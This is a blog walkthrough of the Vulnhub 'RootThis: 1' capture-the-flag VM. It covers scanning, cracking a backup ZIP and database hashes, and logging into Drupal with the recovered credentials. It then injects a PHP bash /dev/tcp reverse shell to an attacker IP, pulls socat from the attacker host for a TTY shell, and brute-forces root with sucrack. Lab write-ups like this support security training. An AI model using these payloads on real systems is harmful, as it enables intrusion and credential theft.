@@ -1,0 +1,375 @@
+
+								
+																		Vulnhub: RootThis: 1 Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on March 1, 2019
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends! Today we are going to take another boot2root challenge known as root this. The credit for making this VM machine goes to “Fred Wemeijer” and it is another boot2root challenge in which our goal is to get root access to complete the challenge. You can download this VM here.
+Security Level: Intermediate
+Flags: There is one flag (flag.txt).
+Penetrating Methodology:
+
+IP Discovery using netdiscover
+Network scanning (Nmap)
+Surfing HTTP service port (80)
+Directory enumeration using dirb
+Getting Backup file using wget
+Cracking password using fcrackzip
+Cracking Hashes using John the Ripper
+Getting Reverse Shell
+Getting a proper TTY shell using socat
+Cracking root password using sucrack
+Retrieving flag
+
+Walkthrough
+Let’s start off with scanning the network to find our target.
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+We found our target –&gt; 192.168.1.135
+Our next step is to scan our target with nmap.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.135
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.135
+					
+				
+			
+		
+
+
+The NMAP output shows us that there is only 1 port open: 80(HTTP)
+We find that port 80 is running http, so we open the IP in our browser.
+
+We don’t find anything on the webpage, so we use dirb to enumerate the directories on the web server.
+
+		
+		
+			
+			
+			
+			
+dirb http://192.168.1.135/
+			
+				
+					
+				
+					1
+				
+						dirb http://192.168.1.135/
+					
+				
+			
+		
+
+
+We find two interesting directories called “backup” and “drupal”. We open the “/drupal” directory and find a Drupal CMS login page. We are unable to login or find any vulnerability on the CMS.
+
+We try to open the “backup/” directory and find that it is a file. So we use “wget” to download the file on our system. After downloading the file, we find that is a ZIP file. When we tried to extract it we are prompted for a password. To brute force, the password protected file we can use a tool called “fcrackzip”. After getting the password for the ZIP file we extract the data and find a SQL file.
+
+		
+		
+			
+			
+			
+			
+wget http://192.168.1.135/backup
+file backup
+frackzip -D -v -u -p /usr/share/wordlists/rockyou.txt backup
+unzip backup
+cat dump.sql
+			
+				
+					
+				
+					12345
+				
+						wget http://192.168.1.135/backupfile backupfrackzip -D -v -u -p /usr/share/wordlists/rockyou.txt backupunzip backupcat dump.sql
+					
+				
+			
+		
+
+
+Searching through the content of the SQL file, we find 2 usernames and their password hashes.
+
+We save the hashes in a file and then use john the ripper to crack the hashes. We are successfully able to crack the hash and get the password for the user “webman”.
+
+		
+		
+			
+			
+			
+			
+john hashes --wordlist=/usr/share/wordlists/rockyou.txt
+			
+				
+					
+				
+					1
+				
+						john hashes --wordlist=/usr/share/wordlists/rockyou.txt
+					
+				
+			
+		
+
+
+We use the credentials “webman: moranguita” to login through Drupal CMS and are successfully able to login.
+
+To get a reverse shell of the target system, we go to add content and add the following php code to get a revere shell:
+
+		
+		
+			
+			
+			
+			
+&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.107/1234 0&gt;&amp;1'");
+			
+				
+					
+				
+					1
+				
+						&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.107/1234 0&gt;&amp;1'");
+					
+				
+			
+		
+
+
+We set up our listener and as soon as we click on save on the CMS we get a reverse shell. Enumerating the target system; inside “/home/user” directory we find a file called “MessageToRoot.txt”. We open the file and find it has hinted that the root password is inside the first 300 words of the rockyou.txt. We try to “su” command and find that we don’t have a proper TTY shell to run the command.
+We tried multiple ways to get a TTY shell, but are unable to spawn one with an available application on the target machine. So we upload socat on the target machine to get a TTY shell. (Download socat from here)
+
+		
+		
+			
+			
+			
+			
+wget http://192.168.1.107/socat
+./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.107:4567
+			
+				
+					
+				
+					12
+				
+						wget http://192.168.1.107/socat./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.107:4567
+					
+				
+			
+		
+
+
+We start a listener on our local system and are able to get a reverse shell. We run “su” command and find that we are able to spawn a TTY shell.
+
+Now we create a dictionary with the first 300 words of rockyou.txt.
+
+		
+		
+			
+			
+			
+			
+head -n 300 /usr/share/wordlists/rockyou.txt &gt; dict.txt
+			
+				
+					
+				
+					1
+				
+						head -n 300 /usr/share/wordlists/rockyou.txt &gt; dict.txt
+					
+				
+			
+		
+
+
+Now as there is SSH running on the target machine, we cannot brute force the username and password. Instead, we can use a tool called “sucrack” that brute forces password locally through “su”. We download it in our system and extract it. Then we compile the application on our system as it is not C-compiler on the target machine. After compiling the application, we archive the compiled application to upload it on the target machine. (You can find more information about sucrack and download sucrack from here)
+
+		
+		
+			
+			
+			
+			
+tar -xvf sucrack-1.2.3.tar.gz
+cd sucrack-1.2.3/
+./configure
+make
+tar -cvf sucrack.tar sucrack-1.2.3/
+			
+				
+					
+				
+					12345
+				
+						tar -xvf sucrack-1.2.3.tar.gzcd sucrack-1.2.3/./configuremaketar -cvf sucrack.tar sucrack-1.2.3/
+					
+				
+			
+		
+
+
+We upload the dictionary file and the compiled application on the target system. We first start our python HTTP server using “SimpleHTTPServer” module and then use “wget” command on the target machine to download it from our local system. After downloading both the files we extracted the tar file.
+
+		
+		
+			
+			
+			
+			
+wget http://192.168.1.107/sucrack.tar
+tar xvf sucrack.tar
+			
+				
+					
+				
+					12
+				
+						wget http://192.168.1.107/sucrack.tartar xvf sucrack.tar
+					
+				
+			
+		
+
+
+After extracting the tar file, we go to “sucrack1-2.3/src” directory as the compiled application is inside this directory and run the command to brute force the password. The application was successfully able to brute force the password for root user. We switched to root user and inside /root directory and we successfully able to get the flag.
+
+		
+		
+			
+			
+			
+			
+./sucrack -u root -w 10 /tmp/dict.txt
+			
+				
+					
+				
+					1
+				
+						./sucrack -u root -w 10 /tmp/dict.txt
+					
+				
+			
+		
+
+ 
+ Author: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
